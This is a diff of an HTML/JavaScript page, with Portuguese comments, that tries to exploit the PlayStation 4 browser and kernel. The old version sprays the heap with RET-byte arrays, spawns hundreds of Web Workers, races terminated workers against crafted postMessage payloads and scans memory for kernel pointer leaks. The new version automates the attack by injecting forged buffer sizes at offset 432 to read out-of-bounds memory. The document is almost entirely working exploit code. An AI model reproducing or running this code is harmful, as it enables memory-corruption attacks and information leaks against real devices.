@@ -1,227 +1,154 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-PT">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 EXPLOIT LAB</title>
+    <title>PS4 SIZE SHIFTER (OFFSET 432)</title>
     <style>
-        body { background-color: #111; color: #fff; font-family: sans-serif; text-align: center; padding: 10px; }
-        h1 { margin: 10px 0; font-size: 18px; color: #0ff; }
-        
-        .panel { border: 1px solid #444; background: #222; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
-        
-        label { display: block; font-size: 14px; color: #aaa; margin-bottom: 5px; }
-        input { background: #000; color: #fff; border: 1px solid #666; padding: 5px; width: 80px; text-align: center; font-size: 16px; }
-        
-        button {
-            width: 100%; padding: 15px; margin-top: 5px;
-            font-size: 16px; font-weight: bold; cursor: pointer;
-            background: #333; color: #fff; border: 2px solid #555;
-        }
-        button:enabled:active { background: #555; }
-        button:disabled { opacity: 0.4; }
-        
-        .btn-spray { border-color: #00f; color: #aaf; }
-        .btn-threads { border-color: #fa0; color: #fe0; }
-        .btn-attack { border-color: #f00; color: #f88; }
-        .btn-scan { border-color: #0f0; color: #8f8; }
-
-        #log { 
-            font-family: monospace; background: #000; color: #0f0; 
-            height: 120px; overflow-y: scroll; text-align: left; 
-            padding: 5px; font-size: 12px; border: 1px solid #333;
-        }
-        
-        #result { display: none; background: #050; padding: 10px; font-size: 20px; font-weight: bold; border: 2px solid #0f0; margin-top: 10px; word-break: break-all; }
+        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
+        h1 { color: #f0f; border-bottom: 2px solid #f0f; display: inline-block; }
+        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
+        #result { font-size: 1.2em; color: #0f0; background: #004; padding: 15px; display: none; text-align: left; white-space: pre-wrap; word-break: break-all; }
+        .success { background-color: #050 !important; border: 2px solid #0f0 !important; }
+        .try { color: #ff0; }
     </style>
 </head>
 <body>
 
-    <h1>PS4 KERNEL LAB (MANUAL)</h1>
-
-    <div class="panel">
-        <div style="display:flex; justify-content: space-around;">
-            <div>
-                <label>Spray (Blocos 64KB)</label>
-                <input type="number" id="inp-spray" value="50">
-            </div>
-            <div>
-                <label>Alvo Threads</label>
-                <input type="number" id="inp-threads" value="415">
-            </div>
-        </div>
-    </div>
-
-    <div class="panel">
-        <button id="btn1" class="btn-spray" onclick="doSpray()">1. ALOCAR MEMÓRIA</button>
-        <button id="btn2" class="btn-threads" onclick="createThreads()" disabled>2. CRIAR THREADS</button>
-        <button id="btn3" class="btn-attack" onclick="doAttack()" disabled>3. ATACAR (3s)</button>
-        <button id="btn4" class="btn-scan" onclick="doScan()" disabled>4. ESCANEAR</button>
-        <button onclick="location.reload()" style="margin-top:10px; background:#400;">REINICIAR TUDO (F5)</button>
-    </div>
-
+    <h1>SIZE SHIFTER (OFFSET 432)</h1>
+    <div id="status">A preparar...</div>
     <div id="result"></div>
-    <div id="log">Console pronto. Ajuste os valores acima.</div>
 
     <script>
-        // CONFIGURAÇÃO FIXA
+        // CONFIGURAÇÃO
+        const TARGET_THREADS = 418; // Usar o valor estável (415-417)
         const SPRAY_SIZE = 512;
-        const TARGET_OFFSET = 384; 
-        const ADDR_BYTE_3 = 0x01; // Endereço 0x01... (Baixo)
-
-        let workers = [];
-        let heapSpray = [];
+        const TARGET_OFFSET = 432; // O offset que causou OOM
         
-        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
+        let workers = [];
+        
+        // Worker que apenas recebe mensagens e devolve o tamanho
+        const blob = new Blob([`
+            onmessage = function(e) {
+                // Se recebermos dados, devolvemos o tamanho para o main thread
+                // Se o exploit funcionar, este tamanho pode ser maior que 512!
+                postMessage({len: e.data.byteLength, data: e.data});
+            }
+        `], {type:'text/javascript'});
         const url = URL.createObjectURL(blob);
+        
+        // Kamikaze para abrir o buraco
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
-        function log(msg) {
-            const el = document.getElementById('log');
-            el.innerHTML += `> ${msg}<br>`;
-            el.scrollTop = el.scrollHeight;
-        }
+        // Vamos tentar tamanhos ligeiramente maiores que 512
+        // Se conseguirmos ler 1024, vazamos o próximo objeto da memória
+        const SIZES_TO_TRY = [
+            0x400, // 1024 (Tentar ler o dobro)
+            0x800, // 2048
+            0x1000, // 4096 (1 Página)
+            0x2000  // 8192
+        ];
+        
+        let currentSizeIdx = 0;
 
-        // 1. SPRAY MANUAL
-        function doSpray() {
-            const count = parseInt(document.getElementById('inp-spray').value);
-            log(`Tentando alocar ${count} blocos...`);
-            
-            try {
-                // Prepara padrão (RET + Shellcode placeholders)
-                // Usando Uint32Array puro para economizar RAM máxima
-                for(let i=0; i<count; i++) {
-                    let arr = new Uint32Array(0x4000); // 64KB cada
-                    arr.fill(0xC3C3C3C3); // Enche rápido
-                    
-                    // Marcação para scan (Pattern)
-                    // Coloca "buracos" onde o kernel pode escrever ou onde leríamos
-                    for(let k=0; k < arr.length; k+=64) {
-                        arr[k]   = 0x41414141; // Marca visual
-                        arr[k+1] = 0x42424242; 
-                        arr[k+4] = 0x00000000; // Slot Leak Low
-                        arr[k+5] = 0x00000000; // Slot Leak High
-                    }
-                    heapSpray.push(arr);
-                }
-                
-                log(`SUCESSO: ${count} blocos alocados.`);
-                log(`Total Arrays: ${heapSpray.length}`);
-                
-                document.getElementById('btn1').disabled = true;
-                document.getElementById('btn2').disabled = false;
-                
-            } catch(e) {
-                log("ERRO OOM! Diminua o valor do Spray.");
-                // Limpa para tentar de novo
-                heapSpray = [];
-            }
-        }
-
-        // 2. THREADS MANUAL
-        function createThreads() {
-            const target = parseInt(document.getElementById('inp-threads').value);
-            log(`Criando ${target} threads...`);
-            document.getElementById('btn2').disabled = true;
+        function start() {
+            document.getElementById('status').innerText = "1. CRIANDO THREADS (415)...";
             
             let i = setInterval(() => {
-                if (workers.length < target) {
-                    try {
-                        workers.push(new Worker(url));
-                    } catch(e) {
-                        log("Erro ao criar worker (Limite atingido?)");
-                        clearInterval(i);
-                    }
-                    if(workers.length % 50 === 0) log(`Workers: ${workers.length}...`);
+                if (workers.length < TARGET_THREADS) {
+                    const w = new Worker(url);
+                    w.onmessage = handleWorkerResponse;
+                    workers.push(w);
                 } else {
                     clearInterval(i);
-                    log(`Threads prontas (${workers.length}).`);
-                    document.getElementById('btn3').disabled = false;
+                    nextAttempt();
                 }
             }, 30);
         }
 
-        // 3. ATAQUE
-        function doAttack() {
-            log("Disparando ataque...");
-            document.getElementById('btn3').disabled = true;
+        function nextAttempt() {
+            if(currentSizeIdx >= SIZES_TO_TRY.length) {
+                document.getElementById('status').innerText = "Fim dos testes. Nenhuma anomalia detectada.";
+                return;
+            }
             
-            const payload = new Uint8Array(SPRAY_SIZE);
-            payload.fill(0x00); 
-            // Aponta para 0x01...
-            payload[TARGET_OFFSET+3] = ADDR_BYTE_3;
+            const size = SIZES_TO_TRY[currentSizeIdx];
+            document.getElementById('status').innerText = `2. TESTANDO TAMANHO: ${size} (0x${size.toString(16)})...`;
+            document.getElementById('status').className = "try";
+            
+            attack(size);
+        }
 
+        function attack(sizeToInject) {
+            // Prepara o payload
+            const payload = new Uint8Array(SPRAY_SIZE);
+            payload.fill(0x00); // Zeros
+            
+            // Offset 272 e 384: Zeros para não crashar execução
+            // Offset 432: O TAMANHO FALSO
+            // Escrevemos o tamanho em Little Endian (Int32 ou Int64)
+            // Vamos assumir Int32 primeiro
+            const view = new DataView(payload.buffer);
+            view.setUint32(TARGET_OFFSET, sizeToInject, true); // Little Endian
+
+            // Dispara por 3 segundos
+            let count = 0;
             const atk = setInterval(() => {
                 const w = new Worker(killerUrl);
                 w.terminate();
-                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
-            }, 10);
-
-            // Para e limpa após 3s
-            setTimeout(() => {
-                clearInterval(atk);
-                log("Ataque finalizado. Limpando memória...");
+                try { 
+                    if(workers.length > 0) {
+                        // Envia Buffer
+                        workers[0].postMessage(payload);
+                    }
+                } catch(e){}
                 
-                // MATA TUDO PARA O SCANNER RODAR LISO
+                count++;
+                if(count > 100) {
+                    clearInterval(atk);
+                    // Passa para o próximo tamanho após uma pausa
+                    setTimeout(() => {
+                        currentSizeIdx++;
+                        nextAttempt();
+                    }, 1000);
+                }
+            }, 20);
+        }
+
+        function handleWorkerResponse(e) {
+            const len = e.data.len;
+            
+            // O normal seria recebermos algo em torno do tamanho do payload (512)
+            // Se recebermos MAIS, temos um vazamento!
+            if (len > SPRAY_SIZE) {
+                document.getElementById('status').innerText = "SUCESSO! VAZAMENTO DETECTADO!";
+                document.getElementById('status').className = "success";
+                
+                let msg = `Tamanho recebido: ${len} bytes (Esperado: ${SPRAY_SIZE})\n`;
+                msg += `DADOS VAZADOS:\n`;
+                
+                // Converte os dados extras para Hex para procurarmos ponteiros
+                const bytes = new Uint8Array(e.data.data);
+                for(let i=SPRAY_SIZE; i<len && i<SPRAY_SIZE+128; i+=8) { // Mostra os primeiros 128 bytes extras
+                     let hex = "";
+                     for(let j=0; j<8 && i+j<len; j++) {
+                         hex = bytes[i+j].toString(16).padStart(2,'0') + hex;
+                     }
+                     msg += `Offset +${i}: 0x${hex}\n`;
+                }
+                
+                const res = document.getElementById('result');
+                res.style.display = 'block';
+                res.innerText = msg;
+                
+                // Parar tudo! Achámos!
                 workers.forEach(w => w.terminate());
                 workers = [];
-                
-                document.getElementById('btn4').disabled = false;
-                log("Pode escanear agora.");
-            }, 3000);
-        }
-
-        // 4. SCANNER
-        function doScan() {
-            log("Iniciando varredura...");
-            document.getElementById('btn4').disabled = true;
-            
-            let found = false;
-            
-            // Varre o spray
-            for(let i=0; i<heapSpray.length; i++) {
-                const arr = heapSpray[i];
-                for(let k=0; k<arr.length; k+=64) {
-                    // Offset 4 e 5 são onde esperamos o leak
-                    let idx = k + 4;
-                    if(idx+1 < arr.length) {
-                        let valLow = arr[idx];
-                        let valHigh = arr[idx+1];
-                        
-                        // Se não for zero e não for nossa marcação inicial
-                        if ((valLow !== 0 || valHigh !== 0) && valLow !== 0x00000000) {
-                             // Check básico de kernel pointer (High bytes != 0)
-                             if(valHigh !== 0) {
-                                 report(valLow, valHigh);
-                                 found = true;
-                                 break;
-                             }
-                        }
-                    }
-                }
-                if(found) break;
-            }
-            
-            if(!found) {
-                log("Nada encontrado.");
-                log("Dica: Aumente o Spray ou tente de novo.");
-                // Reabilita botões para nova tentativa (parcial)
-                document.getElementById('btn1').disabled = false; 
-                document.getElementById('btn1').innerText = "1. ALOCAR MAIS (+)";
+                currentSizeIdx = 999; 
             }
         }
 
-        function report(low, high) {
-            const hLow = (low >>> 0).toString(16).padStart(8, '0');
-            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
-            const addr = `0x${hHigh}${hLow}`;
-            
-            const res = document.getElementById('result');
-            res.style.display = 'block';
-            res.innerText = `LEAK: ${addr}`;
-            log("SUCESSO! ANOTE O NÚMERO.");
-            localStorage.setItem('ps4_leak', addr);
-        }
+        setTimeout(start, 1000);
 
     </script>
 </body>
